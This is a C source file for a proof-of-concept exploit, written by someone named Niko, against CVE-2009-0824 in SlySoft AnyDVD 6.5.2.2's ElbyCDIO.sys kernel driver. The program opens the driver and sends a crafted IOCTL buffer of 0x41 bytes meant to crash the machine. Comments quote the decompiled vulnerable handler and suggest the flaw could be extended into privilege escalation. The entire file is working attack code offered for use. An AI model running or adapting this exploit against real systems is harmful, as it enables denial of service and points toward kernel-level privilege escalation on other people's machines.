#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(TARGET_DRIVER, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned char input[0x8];
	unsigned long bytes_returned = 0;
	unsigned char unused = 0;

	memset(input, 0x41, sizeof(input));

	SetConsoleTitleA("CVE-2009-0824");

	printf("[*] SlySoft AnyDVD 6.5.2.2 'ElbyCDIO.sys' Unsafe Handling of User-Supplied Data Denial of Service Vulnerability\n[*] This exploit could potentially lead to privilege escalation, and as such I will continue this exploit when I have more time.\n[*] Exploit written by Niko\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	// This is the target function. There is a slight chance that we can exploit this for privilege escalation, but I am NOT doing it tonight.
	//	case 2285635:
	//		if ((unsigned int)InputBufferLength < 8)
	//		{
	//			v3 = 0xC000000D;
	//		}
	//		else
	//		{
	//			UserInputBufferControlledValue = *(PVOID**)v4->Parameters.CreatePipe.Parameters;
	//			KeWaitForSingleObject((PVOID)(v7 + 152), Executive, 0, 0, 0i64);
	//			ObfDereferenceObject(UserInputBufferControlledValue[4]);
	//			*((_QWORD*)*UserInputBufferControlledValue + 1) = UserInputBufferControlledValue[1];
	//			*(_QWORD*)UserInputBufferControlledValue[1] = *UserInputBufferControlledValue;
	//			ExFreePool(UserInputBufferControlledValue);
	//			KeReleaseMutex((PRKMUTEX)(v7 + 152), 0);
	//		v3 = 0;
	//		}
	//	break;

	printf("\n[!] Sending a crafted IOCTL request to the vulnerable device driver in 3...");
	Sleep(1000);

	for (int i = 2; i > 0; i--)
	{
		printf("\n[!] %d...", i);
		Sleep(1000);
	}

	DeviceIoControl(h_driver, TARGET_FUNCTION, input, sizeof(input), 0, 0, &bytes_returned, 0);
	Sleep(1000);

	printf("\n[-] How are you still here??");
	unused = getchar();

	return 0;
}